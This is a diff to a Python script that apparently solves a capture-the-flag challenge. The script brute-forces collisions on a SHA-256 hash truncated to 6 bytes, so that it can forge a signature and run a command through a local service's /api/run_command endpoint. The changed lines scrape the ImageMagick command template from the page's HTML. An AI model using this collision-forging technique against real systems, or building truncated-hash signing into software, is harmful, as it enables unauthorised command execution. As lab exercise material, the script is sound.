@@ -2,7 +2,6 @@
 
 import base64
 import hashlib
-import shlex
 import urllib.request
 
 target_command = "ls"
@@ -12,14 +11,12 @@ def hash(message):
     return hashlib.sha256(message).digest()[0:6]
 
 
-def command(text):
-    return f"convert -background lightblue -fill blue -pointsize 40 -size 320x -gravity Center {shlex.quote('caption:' + text)} png:-"
-
+with urllib.request.urlopen(f"http://localhost:5000/?text=foobar") as f:
+    cmd = f.read().decode().split('data-command="')[1].split('"')[0]
 
 seen = {}
-
 for x in range(0x1000000):
-    h = hash(command(str(x)).encode())
+    h = hash(cmd.replace("foobar", str(x)).encode())
     seen[h] = x
 
 x = 0
@@ -35,6 +32,4 @@ with urllib.request.urlopen(f"http://localhost:5000/?text={seen[h]}") as f:
 
 data = urllib.parse.urlencode({"command": command, "signature": sig}).encode()
 with urllib.request.urlopen("http://localhost:5000/api/run_command", data) as f:
-    output = base64.b64decode(f.read().split(b",")[1]).decode()
-
-print(output)
+    print(base64.b64decode(f.read().split(b",")[1]).decode())
